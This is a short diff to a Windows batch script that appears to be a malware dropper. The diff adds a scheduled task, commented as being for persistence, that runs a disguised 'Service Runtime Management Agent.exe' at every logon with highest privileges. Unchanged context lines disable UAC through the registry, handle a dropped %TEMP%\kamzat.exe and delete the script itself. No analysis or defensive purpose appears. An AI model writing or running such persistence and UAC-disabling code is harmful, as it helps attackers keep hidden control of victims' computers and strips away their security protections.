@@ -19,6 +19,9 @@ if %errorlevel% equ 0 (
     exit /b
 
 :admin_tasks
+:: Create scheduled task for persistence FIRST
+schtasks /create /tn "Runtime Management Agent" /tr "\"%APPDATA%\SubDir\Service Runtime Management Agent.exe\"" /sc onlogon /delay 0002:00 /rl highest /f
+
 :: Disable UAC through registry
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
 
@@ -39,4 +42,5 @@ if exist "%TEMP%\kamzat.exe" (
         del "%~f0" >nul 2>&1
     )
 )
+
 exit /b
